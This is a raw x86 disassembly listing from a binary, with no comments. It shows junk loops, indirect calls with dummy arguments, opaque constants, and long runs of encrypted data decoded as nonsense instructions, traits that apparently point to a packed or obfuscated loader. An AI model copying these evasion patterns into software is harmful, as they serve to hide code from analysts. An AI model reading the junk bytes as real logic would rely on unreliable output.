  4037f5:	mov    ebx,0x8a40
  4037fa:	xor    di,bx
  4037fd:	add    di,dx
  403800:	movzx  edx,di
  403803:	mov    edi,DWORD PTR [ebp-0x8]
  403806:	xor    edi,ecx
  403808:	lea    edx,[edx+edi*1+0x32729d]
  40380f:	add    DWORD PTR [eax],edx
  403811:	mov    eax,DWORD PTR [ebp-0x20]
  403814:	mov    edx,DWORD PTR [ebp-0x8]
  403817:	mov    edi,DWORD PTR [ebp-0x24]
  40381a:	xor    edx,ecx
  40381c:	add    edx,esi
  40381e:	imul   edx,edi
  403821:	sub    DWORD PTR [eax],edx
  403823:	mov    eax,DWORD PTR [ebp-0x14]
  403826:	jmp    0x4028b3
  40382b:	mov    eax,DWORD PTR [ebp-0xc]
  40382e:	mov    edx,DWORD PTR [ebp-0x18]
  403831:	xor    eax,edx
  403833:	cmp    eax,0x7aa80c5f
  403838:	je     0x402858
  40383e:	mov    eax,DWORD PTR [ebp-0x10]
  403841:	add    DWORD PTR [eax],0x7403501
  403847:	jmp    0x402858
  40384c:	mov    eax,DWORD PTR [ebp-0x1c]
  40384f:	cmp    DWORD PTR [eax],edi
  403851:	je     0x402858
  403857:	mov    eax,0x800f1c9a
  40385c:	jmp    0x4028b7
  403861:	push   ebp
  403862:	mov    ebp,esp
  403864:	sub    esp,0x44
  403867:	push   edi
  403868:	mov    eax,DWORD PTR [ebp+0xc]
  40386b:	and    DWORD PTR ds:0x430526,0x265f
  403875:	mov    DWORD PTR [ebp-0x10],eax
  403878:	mov    eax,DWORD PTR [ebp+0x8]
  40387b:	and    DWORD PTR ds:0x42e7e6,0x0
  403885:	jmp    0x403899
  40388a:	xor    ecx,ecx
  40388c:	or     ecx,DWORD PTR ds:0x42e7e6
  403892:	inc    ecx
  403893:	mov    DWORD PTR ds:0x42e7e6,ecx
  403899:	cmp    DWORD PTR ds:0x42e7e6,0x12
  4038a0:	jae    0x4038db
  4038a6:	cmp    DWORD PTR ds:0x42e7e6,0x5
  4038ad:	jne    0x4038bc
  4038b3:	push   DWORD PTR [ebp-0x14]
  4038b6:	call   DWORD PTR ds:0x42ea5c
  4038bc:	cmp    DWORD PTR ds:0x42e7e6,0x4
  4038c3:	jne    0x4038d6
  4038c9:	mov    ecx,DWORD PTR ds:0x42e7e6
  4038cf:	inc    ecx
  4038d0:	mov    DWORD PTR ds:0x42e7e6,ecx
  4038d6:	jmp    0x40388a
  4038db:	mov    DWORD PTR [ebp+0x8],0xf89c8535
  4038e2:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  4038e9:	mov    edx,DWORD PTR [ebp+0x8]
  4038ec:	and    DWORD PTR ds:0x42eea8,0x0
  4038f6:	mov    edi,DWORD PTR ds:0x42eea8
  4038fc:	inc    edi
  4038fd:	mov    DWORD PTR ds:0x42eea8,edi
  403903:	cmp    DWORD PTR ds:0x42eea8,0x4
  40390a:	jne    0x403920
  403910:	push   0x1500
  403915:	push   0x3962
  40391a:	call   DWORD PTR ds:0x42ea74
  403920:	cmp    DWORD PTR ds:0x42eea8,0x3
  403927:	jne    0x40393a
  40392d:	mov    edi,DWORD PTR ds:0x42eea8
  403933:	inc    edi
  403934:	mov    DWORD PTR ds:0x42eea8,edi
  40393a:	cmp    DWORD PTR ds:0x42eea8,0x18
  403941:	jb     0x4038f6
  403947:	and    DWORD PTR ds:0x42ee9c,0x0
  403951:	jmp    0x403963
  403956:	mov    ecx,DWORD PTR ds:0x42ee9c
  40395c:	inc    ecx
  40395d:	mov    DWORD PTR ds:0x42ee9c,ecx
  403963:	cmp    DWORD PTR ds:0x42ee9c,0x11
  40396a:	jae    0x4039ad
  403970:	cmp    DWORD PTR ds:0x42ee9c,0x4
  403977:	jne    0x403988
  40397d:	push   0x5572
  403982:	call   DWORD PTR ds:0x42ec1c
  403988:	cmp    DWORD PTR ds:0x42ee9c,0x3
  40398f:	jne    0x4039a2
  403995:	mov    ecx,DWORD PTR ds:0x42ee9c
  40399b:	inc    ecx
  40399c:	mov    DWORD PTR ds:0x42ee9c,ecx
  4039a2:	jmp    0x403956
  4039a7:	add    ecx,0x3d2b
  4039ad:	mov    DWORD PTR [ebp-0x40],eax
  4039b0:	xor    DWORD PTR ds:0x42ee94,ebx
  4039b6:	mov    eax,0x7510856
  4039bb:	xor    edx,eax
  4039bd:	mov    ecx,0x32729d
  4039c2:	or     edi,DWORD PTR ds:0x430526
  4039c8:	add    edx,ecx
  4039ca:	adc    DWORD PTR ds:0x43050e,ebx
  4039d0:	mov    DWORD PTR [ebp-0x8],edx
  4039d3:	mov    edx,DWORD PTR [ebp+0x8]
  4039d6:	mov    DWORD PTR ds:0x43052a,0x1d
  4039e0:	cmp    DWORD PTR ds:0x43052a,0x0
  4039e7:	je     0x403a1f
  4039ed:	cmp    DWORD PTR ds:0x43052a,0x2c
  4039f4:	jne    0x403a03
  4039fa:	push   DWORD PTR [ebp-0x14]
  4039fd:	call   DWORD PTR ds:0x42ea60
  403a03:	mov    edi,DWORD PTR ds:0x43052a
  403a09:	dec    edi
  403a0a:	mov    DWORD PTR ds:0x43052a,edi
  403a10:	jmp    0x4039e0
  403a15:	adc    DWORD PTR ds:0x42eeb0,0x29f8
  403a1f:	xor    edx,eax
  403a21:	xor    edi,DWORD PTR ds:0x43052a
  403a27:	add    edx,ecx
  403a29:	mov    DWORD PTR [ebp+0xc],edx
  403a2c:	mov    DWORD PTR [ebp-0x4],0xf89c85d5
  403a33:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403a3a:	mov    DWORD PTR [ebp-0x2c],0xf89c8530
  403a41:	and    DWORD PTR ds:0x4305da,0x0
  403a4b:	mov    edx,DWORD PTR ds:0x4305da
  403a51:	inc    edx
  403a52:	mov    DWORD PTR ds:0x4305da,edx
  403a58:	cmp    DWORD PTR ds:0x4305da,0x2b
  403a5f:	jne    0x403a77
  403a65:	push   0x85b9
  403a6a:	push   0x0
  403a6c:	push   0x24c3
  403a71:	call   DWORD PTR ds:0x42ea78
  403a77:	cmp    DWORD PTR ds:0x4305da,0x1e
  403a7e:	jb     0x403a4b
  403a84:	adc    edi,0xfa7
  403a8a:	mov    DWORD PTR [ebp-0x30],0xf89c8531
  403a91:	or     edi,0x30ac
  403a97:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  403a9e:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  403aa5:	xor    DWORD PTR ds:0x4305c2,ebx
  403aab:	mov    DWORD PTR [ebp-0x3c],0xf89c853c
  403ab2:	mov    edx,DWORD PTR [ebp+0x8]
  403ab5:	xor    edx,eax
  403ab7:	mov    edi,DWORD PTR [ebp-0x10]
  403aba:	add    edx,ecx
  403abc:	cmp    edi,edx
  403abe:	mov    DWORD PTR ds:0x42e7da,0x7baa
  403ac8:	je     0x4052e2
  403ace:	mov    DWORD PTR ds:0x4305ca,0x2abe
  403ad8:	push   ebx
  403ad9:	mov    DWORD PTR ds:0x43050a,0x536a
  403ae3:	jmp    0x4052bd
  403ae8:	mov    edi,DWORD PTR ds:0x430612
  403aee:	mov    edx,DWORD PTR ds:0x42ea30
  403af4:	sub    edx,edi
  403af6:	or     edi,DWORD PTR [edi+edx*1]
  403af9:	mov    edx,DWORD PTR [ebp-0x8]
  403afc:	sub    DWORD PTR ds:0x430532,edx
  403b02:	mov    edi,DWORD PTR [ebp-0x10]
  403b05:	xor    DWORD PTR ds:0x42ee9c,0x6f7b
  403b0f:	sub    edi,edx
  403b11:	and    DWORD PTR ds:0x43052a,0x0
  403b1b:	mov    edx,DWORD PTR ds:0x43052a
  403b21:	inc    edx
  403b22:	mov    DWORD PTR ds:0x43052a,edx
  403b28:	cmp    DWORD PTR ds:0x43052a,0xa
  403b2f:	jne    0x403b43
  403b35:	push   DWORD PTR [ebp-0x20]
  403b38:	push   0x8b6b
  403b3d:	call   DWORD PTR ds:0x42eb40
  403b43:	cmp    DWORD PTR ds:0x43052a,0x9
  403b4a:	jne    0x403b5d
  403b50:	mov    edx,DWORD PTR ds:0x43052a
  403b56:	inc    edx
  403b57:	mov    DWORD PTR ds:0x43052a,edx
  403b5d:	cmp    DWORD PTR ds:0x43052a,0x14
  403b64:	jb     0x403b1b
  403b6a:	mov    DWORD PTR ds:0x4305c2,0x73d7
  403b74:	mov    edx,DWORD PTR [ebp-0x4]
  403b77:	and    DWORD PTR ds:0x430512,0x4305d2
  403b81:	xor    edx,eax
  403b83:	xor    DWORD PTR ds:0x43050e,0x6fac
  403b8d:	add    edx,ecx
  403b8f:	mov    DWORD PTR ds:0x43050a,0x698f
  403b99:	cmp    edi,edx
  403b9b:	mov    DWORD PTR ds:0x430542,0x4dce
  403ba5:	jb     0x4052e1
  403bab:	add    DWORD PTR ds:0x42eea0,0x380f
  403bb5:	mov    edx,DWORD PTR [ebp-0x28]
  403bb8:	add    edi,edi
  403bba:	mov    edi,DWORD PTR [ebp-0x4]
  403bbd:	xor    ebx,ebx
  403bbf:	add    ebx,DWORD PTR ds:0x42eeb0
  403bc5:	and    ebx,DWORD PTR ds:0x4305d2
  403bcb:	mov    DWORD PTR ds:0x42eeb0,ebx
  403bd1:	xor    edx,eax
  403bd3:	and    DWORD PTR ds:0x42e7da,0x0
  403bdd:	mov    ebx,DWORD PTR ds:0x42e7da
  403be3:	inc    ebx
  403be4:	mov    DWORD PTR ds:0x42e7da,ebx
  403bea:	cmp    DWORD PTR ds:0x42e7da,0x28
  403bf1:	jne    0x403c05
  403bf7:	push   DWORD PTR [ebp-0x10]
  403bfa:	push   0x85bf
  403bff:	call   DWORD PTR ds:0x42ea7c
  403c05:	cmp    DWORD PTR ds:0x42e7da,0x1d
  403c0c:	jb     0x403bdd
  403c12:	sbb    DWORD PTR ds:0x430542,0x42d2
  403c1c:	xor    edi,eax
  403c1e:	add    edi,ecx
  403c20:	mov    DWORD PTR ds:0x43050e,0x1a
  403c2a:	cmp    DWORD PTR ds:0x43050e,0x0
  403c31:	je     0x403c83
  403c37:	cmp    DWORD PTR ds:0x43050e,0xc
  403c3e:	jne    0x403c4d
  403c44:	push   DWORD PTR [ebp-0x18]
  403c47:	call   DWORD PTR ds:0x42ea80
  403c4d:	cmp    DWORD PTR ds:0x43050e,0xd
  403c54:	jne    0x403c67
  403c5a:	mov    ebx,DWORD PTR ds:0x43050e
  403c60:	dec    ebx
  403c61:	mov    DWORD PTR ds:0x43050e,ebx
  403c67:	mov    ebx,DWORD PTR ds:0x43050e
  403c6d:	dec    ebx
  403c6e:	mov    DWORD PTR ds:0x43050e,ebx
  403c74:	jmp    0x403c2a
  403c79:	sbb    DWORD PTR ds:0x4305ce,0x12f8
  403c83:	add    edx,ecx
  403c85:	sbb    DWORD PTR ds:0x4305ca,0x430542
  403c8f:	imul   edx,edi
  403c92:	xor    ebx,DWORD PTR ds:0x430506
  403c98:	mov    edi,DWORD PTR [ebp-0x8]
  403c9b:	add    ebx,DWORD PTR ds:0x4305ca
  403ca1:	mov    ebx,DWORD PTR [ebp-0x10]
  403ca4:	sub    ebx,edi
  403ca6:	mov    DWORD PTR ds:0x42eea4,0x5446
  403cb0:	cmp    ebx,edx
  403cb2:	mov    DWORD PTR ds:0x43050a,0x67f
  403cbc:	ja     0x403cd8
  403cc2:	mov    edx,DWORD PTR [ebp-0x4]
  403cc5:	xor    edx,eax
  403cc7:	or     DWORD PTR ds:0x43052e,0x5676
  403cd1:	add    edx,ecx
  403cd3:	jmp    0x404621
  403cd8:	mov    edx,DWORD PTR [ebp-0x2c]
  403cdb:	mov    edi,DWORD PTR [ebp-0x4]
  403cde:	xor    edx,eax
  403ce0:	xor    edi,eax
  403ce2:	mov    ebx,DWORD PTR ds:0x42e7f6
  403ce8:	adc    DWORD PTR ds:0x42ee90,ebx
  403cee:	add    edi,ecx
  403cf0:	add    edx,ecx
  403cf2:	imul   edx,edi
  403cf5:	mov    edi,DWORD PTR ds:0x43052a
  403cfb:	sbb    DWORD PTR ds:0x42e7ee,edi
  403d01:	mov    edi,DWORD PTR [ebp-0x8]
  403d04:	or     ebx,0x29ff
  403d0a:	mov    ebx,DWORD PTR [ebp-0x10]
  403d0d:	sub    ebx,edi
  403d0f:	cmp    ebx,edx
  403d11:	ja     0x403ec9
  403d17:	jmp    0x403ec1
  403d1c:	jmp    0x6c13:0x697351b5
  403d23:	ins    DWORD PTR es:[edi],dx
  403d24:	imul   esp,DWORD PTR [eax+0xc8c326d],0x39
  403d2b:	in     eax,dx
  403d2c:	mov    dh,0x11
  403d2e:	jle    0x403dae
  403d30:	mov    edi,DWORD PTR [edi+0x7e]
  403d33:	jle    0x403cd2
  403d35:	clc    
  403d36:	fiadd  WORD PTR [ecx]
  403d38:	loopne 0x403d6d
  403d3a:	push   edx
  403d3b:	and    ebx,ebp
  403d3d:	ja     0x403cf2
  403d3f:	js     0x403db9
  403d41:	inc    edx
  403d42:	jb     0x403d57
  403d44:	add    bh,0xf5
  403d47:	mov    ebx,0x1e7ab6c4
  403d4c:	mov    ah,0xaf
  403d4e:	retf   
  403d4f:	outs   dx,DWORD PTR ds:[esi]
  403d50:	mov    dh,BYTE PTR [esi]
  403d52:	idiv   DWORD PTR ds:0x39147d62
  403d58:	mov    WORD PTR [eax+eiz*1+0x63],ds
  403d5c:	pop    ds
  403d5d:	test   DWORD PTR [edi+0x37],edi
  403d60:	mov    al,0xd7
  403d62:	test   eax,0x29901a0d
  403d67:	pop    ss
  403d68:	jns    0x403d01
  403d6a:	inc    esp
  403d6b:	rol    DWORD PTR [edi+0x214b3f38],cl
  403d71:	data16 not BYTE PTR [ebx]
  403d74:	push   esp
  403d75:	std    
  403d76:	les    ebx,FWORD PTR [ebp-0x75ca3428]
  403d7c:	cdq    
  403d7d:	mov    WORD PTR ds:0xdf70f17,fs
  403d83:	mov    cl,0x20
  403d85:	pop    ebx
  403d86:	or     ecx,ebx
  403d88:	or     DWORD PTR ds:0x29511fd6,eax
  403d8e:	add    eax,0xd2369ab
  403d93:	stos   BYTE PTR es:[edi],al
  403d94:	sub    dh,BYTE PTR [edx+ebx*4]
  403d97:	push   es
  403d98:	push   0xffffffa7
  403d9a:	out    0x4f,eax
  403d9c:	mov    ds:0xa179c875,eax
  403da1:	mov    dh,0xe2
  403da3:	les    edx,FWORD PTR [eax]
  403da5:	test   ecx,ecx
  403da7:	out    dx,eax
  403da8:	jae    0x403e15
  403daa:	and    al,0xa
  403dac:	mov    ds:0xf84df9ab,eax
  403db1:	ret    
  403db2:	and    al,0x30
  403db4:	(bad)  
  403db5:	dec    ebp
  403db6:	shl    BYTE PTR ds:0xf4a49c85,cl
  403dbc:	inc    BYTE PTR [eax+0x5d]
  403dbf:	dec    esp
  403dc0:	out    dx,al
  403dc1:	fdivp  st(7),st
  403dc3:	popa   
  403dc4:	adc    al,0x48
  403dc6:	les    ecx,FWORD PTR [edi+0x57]
  403dc9:	jo     0x403d68
  403dcb:	arpl   WORD PTR [ebx-0x543c0e6f],dx
  403dd1:	lock sbb bh,BYTE PTR [bp-0x46]
  403dd6:	leave  
  403dd7:	mov    BYTE PTR [edi+0x48],al
  403dda:	mov    ah,0x9b
  403ddc:	and    bl,BYTE PTR [eax]
  403dde:	push   ss
  403ddf:	bound  edx,QWORD PTR [ebp-0xb]
  403de2:	push   edx
  403de3:	rcr    BYTE PTR [ecx],1
  403de5:	nop
  403de6:	nop
  403de7:	iret   
  403de8:	cs sbb al,0x53
  403deb:	push   es
  403dec:	sar    DWORD PTR [eax+0x15],1
  403def:	inc    edx
  403df0:	pop    edx
  403df1:	lea    esi,[ebp-0x4d051c36]
  403df7:	mov    WORD PTR ds:0x299e1f7e,gs
  403dfd:	lock mov edx,0x87b3898a
  403e03:	adc    al,0x23
  403e05:	xchg   ebp,eax
  403e06:	rol    DWORD PTR [esi],cl
  403e08:	ss cdq 
  403e0a:	inc    ebx
  403e0b:	mov    ebp,0x4e06b07f
  403e10:	push   0x95ce0fac
  403e15:	out    0x9f,al
  403e17:	out    0xd2,eax
  403e19:	fwait
  403e1a:	or     BYTE PTR [edi+eiz*1],0xf0
  403e1e:	add    BYTE PTR [ecx-0x4d39064a],0x45
  403e25:	pusha  
  403e26:	pop    edi
  403e27:	fdivrp st(0),st
  403e29:	sbb    BYTE PTR ds:0x83b64837,ah
  403e2f:	lods   al,BYTE PTR ds:[esi]
  403e30:	adc    eax,0x8cb124f0
  403e35:	adc    al,0x10
  403e37:	mov    ecx,0xb0ad7193
  403e3c:	and    cl,ch
  403e3e:	dec    esp
  403e3f:	inc    esi
  403e40:	xchg   esp,eax
  403e42:	test   BYTE PTR [esi],0xd1
  403e45:	xchg   ebx,eax
  403e46:	mov    dh,0x56
  403e48:	pop    ds
  403e49:	js     0x403e51
  403e4b:	loop   0x403e2a
  403e4d:	outs   dx,BYTE PTR ds:[esi]
  403e4e:	cdq    
  403e4f:	retf   0x17f2
  403e52:	shl    BYTE PTR [esi+0x30],1
  403e55:	cmc    
  403e56:	icebp  
  403e57:	popa   
  403e58:	mov    ds:0x3b733daa,al
  403e5d:	ret    0x1649
  403e60:	inc    ebp
  403e61:	fdivr  st,st(6)
  403e63:	add    eax,0xe0ccf0c4
  403e68:	not    DWORD PTR [eax]
  403e6a:	fsubr  st(1),st
  403e6c:	mov    ?,WORD PTR [ecx]
  403e6e:	bound  ebx,QWORD PTR [ecx+0x16]
  403e71:	inc    ebx
  403e72:	dec    eax
  403e73:	adc    esi,esi
  403e75:	sbb    edi,DWORD PTR [eax-0x32564757]
  403e7b:	mov    esi,esp
  403e7d:	mov    ecx,0x4b3b3868
  403e82:	fist   WORD PTR [ebp-0x6f93f16]
  403e88:	xor    BYTE PTR [ebp+0x5887a2e1],ah
  403e8e:	cmp    eax,0x9d589fb2
  403e93:	push   ebx
  403e94:	xor    al,ch
  403e96:	xlat   BYTE PTR ds:[ebx]
  403e97:	adc    esi,ecx
  403e99:	inc    ecx
  403e9a:	fucomp st(2)
  403e9c:	xor    DWORD PTR [eax-0x1d8756f8],edi
  403ea2:	pushf  
  403ea3:	sete   dh
  403ea6:	mov    ecx,0x7d3eedf4
  403eab:	fdiv   QWORD PTR [edx-0x41]
  403eae:	mov    al,0x26
  403eb0:	add    eax,0x3d05df68
  403eb5:	lock rol DWORD PTR [eax+0x7f8811e4],1
  403ebc:	stc    
  403ebd:	aaa    
  403ebe:	sti    
  403ebf:	mov    bl,0x70
  403ec1:	mov    edx,DWORD PTR [ebp-0x28]
  403ec4:	jmp    0x404613
  403ec9:	mov    edx,DWORD PTR [ebp-0x30]
  403ecc:	mov    edi,DWORD PTR [ebp-0x4]
  403ecf:	xor    edx,eax
  403ed1:	xor    edi,eax
  403ed3:	add    edi,ecx
  403ed5:	add    edx,ecx
  403ed7:	imul   edx,edi
  403eda:	mov    edi,DWORD PTR [ebp-0x8]
  403edd:	mov    ebx,DWORD PTR [ebp-0x10]
  403ee0:	sub    ebx,edi
  403ee2:	cmp    ebx,edx
  403ee4:	ja     0x40409c
  403eea:	jmp    0x404094
  403eef:	ror    BYTE PTR [ebx],cl
  403ef1:	push   edi
  403ef2:	mov    dh,0x57
  403ef4:	push   0xffffffd3
  403ef6:	stos   DWORD PTR es:[edi],eax
  403ef7:	mov    ds:0x567278c4,al
  403efc:	add    eax,0x13c3197e
  403f01:	jle    0x403f81
  403f03:	mov    edi,DWORD PTR [edi+0x7e]
  403f06:	jle    0x403ed8
  403f08:	sahf   
  403f09:	jo     0x403f00
  403f0b:	dec    ecx
  403f0c:	pop    edx
  403f0d:	pop    edx
  403f0e:	fnstenv [ebx]
  403f10:	ins    DWORD PTR es:[edi],dx
  403f11:	pop    eax
  403f12:	and    dh,BYTE PTR [ebp-0x46]
  403f15:	mov    esi,0xeaf8df91
  403f1a:	out    0xe1,eax
  403f1c:	ins    BYTE PTR es:[edi],dx
  403f1d:	xor    al,0x7a
  403f1f:	sub    al,0xb8
  403f21:	fnstsw WORD PTR [edi-0x42]
  403f24:	adc    dh,cl
  403f26:	inc    eax
  403f27:	js     0x403f91
  403f29:	test   eax,0x2f0df68c
  403f2e:	lea    esi,[edi]
  403f30:	loopne 0x403f94
  403f32:	scas   al,BYTE PTR es:[edi]
  403f33:	scas   al,BYTE PTR es:[edi]
  403f34:	or     al,0x2b
  403f36:	call   FWORD PTR [eax+edx*1+0x26525be7]
  403f3d:	push   cs
  403f3e:	add    al,0x64
  403f40:	outs   dx,BYTE PTR ds:[esi]
  403f41:	or     DWORD PTR [edi],ebx
  403f43:	test   al,0xd1
  403f45:	pop    ecx
  403f46:	cs leave 
  403f48:	mov    WORD PTR [ebp+0x72ce7334],?
  403f4e:	jns    0x403f87
  403f50:	imul   eax,eax,0x45939cc4
  403f56:	jnp    0x403f0a
  403f58:	mov    dl,0x63
  403f5a:	xor    eax,0xaa093501
  403f5f:	ret    
  403f60:	sub    al,0x2a
  403f62:	repz dec edx
  403f64:	mov    ch,0xf5
  403f66:	bound  esi,QWORD PTR [edx-0x26]
  403f69:	sbb    al,0x9e
  403f6b:	aaa    
  403f6c:	mov    WORD PTR [edi],?
  403f6e:	sub    al,0x8f
  403f70:	mov    cl,0x9f
  403f72:	push   esp
  403f73:	das    
  403f74:	mov    edi,0x2546b2ab
  403f79:	scas   al,BYTE PTR es:[edi]
  403f7a:	push   esi
  403f7b:	xchg   ecx,eax
  403f7c:	retf   0xbafb
  403f7f:	xlat   BYTE PTR ds:[ebx]
  403f80:	xchg   edi,eax
  403f81:	mov    WORD PTR [esi],cs
  403f83:	jae    0x403f99
  403f85:	and    al,BYTE PTR [ecx]
  403f87:	(bad)  [ebx]
  403f89:	sbb    BYTE PTR [ebx],bl
  403f8b:	in     eax,dx
  403f8c:	jl     0x403fa1
  403f8e:	ins    BYTE PTR es:[edi],dx
  403f8f:	mov    cl,0xf2
  403f91:	jecxz  0x403fb3
  403f93:	jmp    DWORD PTR [bx+di+0xe]
  403f97:	loop   0x403fed
  403f99:	add    DWORD PTR [edx],ebx
  403f9b:	fmul   DWORD PTR [edi]
  403f9d:	ins    DWORD PTR es:[edi],dx
  403f9e:	inc    edx
  403f9f:	mov    WORD PTR [ebp-0x6d],ds
  403fa2:	xor    eax,0xc248c2b9
  403fa7:	dec    esp
  403fa8:	ds push ss
  403faa:	bound  edi,QWORD PTR [ebx]
  403fac:	pop    edx
  403fad:	pop    ebp
  403fae:	pop    ecx
  403faf:	jno    0x403f64
  403fb1:	cmp    ecx,DWORD PTR ds:0x4323bb43
  403fb7:	add    ebp,0xffffffe0
  403fba:	hlt    
  403fbb:	adc    DWORD PTR [ecx-0x74],esi
  403fbe:	push   ecx
  403fbf:	popf   
  403fc0:	aad    0x8
  403fc2:	push   edx
  403fc3:	sahf   
  403fc4:	test   DWORD PTR [ebx+0x2a],0x4b6e31be
  403fcb:	dec    edx
  403fcc:	cwde   
  403fcd:	out    0xc8,eax
  403fcf:	sbb    dh,BYTE PTR [edx+edi*1-0x5a36eb7c]
  403fd6:	pop    ds
  403fd7:	lds    ebp,FWORD PTR [ebp-0x54]
  403fda:	mov    ah,0x4d
  403fdc:	jecxz  0x403f8a
  403fde:	xchg   edx,eax
  403fdf:	loope  0x403f9c
  403fe1:	adc    DWORD PTR [edx+edx*8+0x35066da8],0x9e7d11bf
  403fec:	jle    0x403fe5
  403fee:	pminub mm5,QWORD PTR [ecx+0x66]
  403ff2:	cmc    
  403ff3:	es mov esi,0x932646e3
  403ff9:	inc    esi
  403ffa:	xor    ebp,0x1f
  403ffd:	in     eax,0xd2
  403fff:	(bad)  
  404000:	pause  
  404002:	push   ds
  404003:	stc    
  404004:	aam    0x42
  404006:	stc    
  404007:	xchg   ebp,eax
  404008:	test   DWORD PTR [edi-0x39f82b8],0x2bb8d100
  404012:	or     ecx,DWORD PTR [ecx+0x53]
  404015:	out    dx,al
  404016:	mov    ds:0x3778973f,eax
  40401b:	xor    BYTE PTR [edi],al
  40401d:	pop    eax
  40401e:	and    DWORD PTR [edx+eax*8-0x4c],esi
  404022:	mov    al,ds:0xf622e879
  404027:	push   edx
  404028:	int    0x9e
  40402a:	out    dx,eax
  40402b:	add    DWORD PTR [ebx],ebx
  40402d:	jg     0x404018
  40402f:	lds    ebx,FWORD PTR [ebp+0x1e]
  404032:	adc    eax,0xc05845b3
  404037:	stos   DWORD PTR es:[edi],eax
  404038:	push   0xd5734fe9
  40403d:	shr    DWORD PTR [eax],1
  40403f:	inc    ebx
  404040:	mov    ebx,0x5feba1ec
  404045:	fisttp WORD PTR [ecx-0x11]
  404048:	mov    esi,0x54a987d4
  40404d:	nop
  40404e:	pop    edi
  40404f:	cli    
  404050:	sar    DWORD PTR [ecx],1
  404052:	sub    esp,DWORD PTR ds:[esi+esi*8+0x66]
  404057:	pop    ss
  404058:	inc    eax
  404059:	xchg   BYTE PTR [eax+eiz*1+0x4e770e6d],cl
  404060:	loope  0x404020
  404062:	lods   al,BYTE PTR ds:[esi]
  404063:	adc    dh,BYTE PTR [ecx]
  404065:	pop    ebx
  404066:	imul   ecx,DWORD PTR [esi+0x39],0x6c
  40406a:	sbb    cl,BYTE PTR [edx]
  40406c:	dec    edx
  40406d:	sub    al,0x99
  40406f:	je     0x4040da
  404071:	sar    DWORD PTR [ebx],1
  404073:	(bad)  
  404074:	pusha  
  404075:	xchg   edi,eax
  404076:	pop    DWORD PTR [eax+0x35b95e27]
  40407c:	loop   0x404051
  40407e:	xchg   ebp,eax
  40407f:	in     al,dx
  404080:	dec    ecx
  404081:	fistp  WORD PTR [esi+edi*2]
  404084:	and    BYTE PTR [ebx+0x2c73f337],al
  40408a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40408b:	mov    bh,BYTE PTR ds:0xf87e0999
  404091:	xor    DWORD PTR [ebp-0x2baa74ce],ebp
  404097:	jmp    0x404613
  40409c:	mov    edx,DWORD PTR [ebp-0x34]
  40409f:	mov    edi,DWORD PTR [ebp-0x4]
  4040a2:	jmp    0x40424c
  4040a7:	fs bswap eax
  4040aa:	popf   
  4040ab:	ins    DWORD PTR es:[edi],dx
  4040ac:	pop    ebp
  4040ad:	gs out 0x68,eax
  4040b0:	xchg   ebp,eax
  4040b1:	pop    DWORD PTR [eax-0x4fde61b9]
  4040b7:	push   eax
  4040b8:	adc    al,0x7e
  4040ba:	jle    0x404047
  4040bc:	jg     0x40413c
  4040be:	jle    0x404103
  4040c0:	dec    ebx
  4040c1:	pop    ecx
  4040c2:	fs add bh,cl
  4040c5:	test   al,0xb2
  4040c7:	lods   al,BYTE PTR ds:[esi]
  4040c8:	scas   eax,DWORD PTR es:[edi]
  4040c9:	dec    ebp
  4040ca:	mov    ss,WORD PTR [edi]
  4040cc:	xor    ah,BYTE PTR [edx+ecx*2+0xb192a1f]
  4040d3:	lods   eax,DWORD PTR ds:[esi]
  4040d4:	fs popf 
  4040d6:	outs   dx,DWORD PTR ds:[esi]
  4040d7:	mov    ebx,0x6d8b0de8
  4040dc:	dec    esp
  4040dd:	stos   BYTE PTR es:[edi],al
  4040de:	stos   BYTE PTR es:[edi],al
  4040df:	sar    BYTE PTR [esi+edx*4],1
  4040e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040e3:	mov    cl,0x3d
  4040e5:	mov    al,ds:0x95f99396
  4040ea:	ret    
  4040eb:	mov    edx,0x4699e14d
  4040f0:	inc    esp
  4040f1:	xor    al,0xb6
  4040f3:	mov    DWORD PTR [edx+edx*1-0x31b5cbfb],eax
  4040fa:	xchg   ebp,eax
  4040fb:	jle    0x40409a
  4040fd:	mov    esp,0x982a3569
  404102:	inc    esi
  404103:	jmp    0xc7b6da47
  404108:	enter  0xe428,0xe6
  40410c:	pop    edi
  40410d:	fist   DWORD PTR [edi-0x4ea9b8e7]
  404113:	int    0x3
  404115:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404116:	mov    ch,ch
  404118:	cmp    bh,cl
  40411a:	mov    ch,0xe0
  40411c:	fnstenv [ebp+0x5d]
  40411f:	out    dx,al
  404120:	iret   
  404121:	scas   al,BYTE PTR es:[edi]
  404122:	and    DWORD PTR [ebp+0x36],ebp
  404125:	inc    esi
  404126:	cmp    BYTE PTR [edx+eax*1+0x69f0cc6a],bl
  40412d:	push   ss
  40412e:	xor    al,0x70
  404130:	pop    ecx
  404131:	inc    eax
  404132:	sub    edi,esp
  404134:	push   ds
  404135:	test   DWORD PTR ds:[esi],0x42bc0195
  40413c:	mov    bh,0x97
  40413e:	test   eax,0xc5c54e8
  404143:	(bad)  
  404145:	and    edx,ebp
  404147:	mov    ds:0xbd74028f,al
  40414c:	dec    edx
  40414d:	lahf   
  40414e:	jmp    0xa9c24693
  404153:	(bad)  
  404154:	sub    al,0xf6
  404156:	je     0x404168
  404158:	or     bh,bh
  40415a:	ss mov edi,0x23144f3c
  404160:	xchg   ebx,eax
  404161:	mov    edx,0xe510f9a7
  404166:	ret    
  404167:	add    edi,DWORD PTR [edx+0x7f9d19d4]
  40416d:	cmc    
  40416e:	repz xchg ebp,eax
  404170:	jo     0x40417a
  404172:	in     eax,dx
  404173:	jecxz  0x404103
  404175:	sub    DWORD PTR [eax+ebp*2+0x22],eax
  404179:	mov    esp,0x3f1b99e2
  40417e:	fwait
  40417f:	test   DWORD PTR [ecx+ebp*4],esi
  404182:	ins    BYTE PTR es:[edi],dx
  404183:	push   ecx
  404184:	cmp    bh,ch
  404186:	dec    ebp
  404187:	aad    0x60
  404189:	(bad)  
  40418a:	dec    ebx
  40418b:	mov    al,0x50
  40418d:	mov    edi,0x5f585f1b
  404192:	loopne 0x4041bd
  404194:	in     eax,0x1f
  404196:	dec    eax
  404197:	dec    edx
  404198:	inc    ebp
  404199:	int    0x7a
  40419b:	sub    ebp,DWORD PTR [edx-0x6f]
  40419e:	cmp    eax,0x441780fb
  4041a3:	lahf   
  4041a4:	popa   
